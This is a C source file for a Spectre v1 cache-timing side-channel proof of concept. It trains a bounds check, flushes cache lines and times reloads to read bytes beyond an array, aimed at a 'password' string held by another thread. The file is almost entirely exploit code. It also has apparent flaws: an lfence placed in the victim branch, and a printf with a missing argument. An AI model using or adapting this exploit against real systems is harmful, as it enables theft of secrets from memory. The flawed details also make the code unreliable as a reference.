#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <pthread.h>
#include <x86intrin.h> /* for rdtscp and clflush */

unsigned int array1_size = 16;
unsigned char array1[16] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15};
unsigned char array2[256 * 512];// cache get one page(512Byte)

unsigned char temp = 0;
void victim_function(unsigned long x){
    if (x >0 && x < array1_size){
        asm volatile ("lfence":::"memory");
        temp &= array2[array1[x] * 512];
    }
}

#define CACHE_HIT_THRESHOLD (80)

unsigned char readMemoryByte(unsigned long malicious_x){
    int results[256];

    for (int i = 0; i < 256; i++){
        results[i] = 0;
    }

    for (int i = 0; i < 256; i++){
        _mm_clflush(&array2[i * 512]);
    }

    for (int i = 0; i <29; ++i){
        _mm_clflush(&array1_size);
        for (volatile int z = 0; z < 100; z++);
        unsigned long x = (unsigned long)( (  (i % 6) - 1) & ~0xFFFF);
        x = (x | (x >> 16));
        x = 1 ^ (x & (malicious_x ^ 1));
        victim_function(x);
    }

    //prevent stride prediction
    for(int i = 0; i < 256; i++){
        unsigned int junk = 0;
        int mix_i = (i * 167) & 255;
        volatile unsigned char *addr = &array2[mix_i * 512];
        unsigned long time1 = __rdtscp(&junk);
        junk = *addr;
        unsigned long time2 = __rdtscp(&junk) - time1;
        if (time2 <= CACHE_HIT_THRESHOLD){
            ++results[mix_i];
        }
    }

    int j = 0;
    for (int i = 0; i < 256; ++i){
        if (results[i] >= results[j]){
            j = i;
        }
    }

    return (unsigned char)j;
}

volatile int signal = 0;
long se = 0;

void *other_client(void *args){
    const unsigned char *Secret = "other client password";
    const unsigned char *s = "123456789";

    se = Secret;
    printf("%p - ",Secret);
    fflush(stdout);
    while(1){
        if(signal){
            break;
        }
        usleep(100000);
    }
    se = s;
    printf("sub thread exit\n");
}

int main(){
    pthread_t tids;

    int ret = pthread_create(&tids, NULL, other_client, NULL);
    if (ret != 0) {
        printf("pthread_create error: error_code = %d\n", ret);
    }
    usleep(1000000);

    long malicious_x =0;
    int len = 21;

    printf("%p = %d\n",array1,(void*)se - (void*)array1);

    scanf("%ld%ld",&malicious_x,&len);
    printf("shift %ld bytes\n",malicious_x);

//    for(int i =0;i<len;++i){
//        printf("Read at addr: %p ", malicious_x + array1);
//        printf("%c\n",*(array1+malicious_x));
//        malicious_x++;
//    }

    for(unsigned long i = 0; i < sizeof(array2); i++){
        array2[i] = 0;
    }

    for(int i =0;i<len;++i){
        printf("Read at addr: %p ", malicious_x + array1);
        unsigned char val = readMemoryByte(malicious_x++);
        printf("0x%02X='%c'\n", val);
    }

    signal = 1;
    pthread_join(tids,NULL);
    return (0);
}
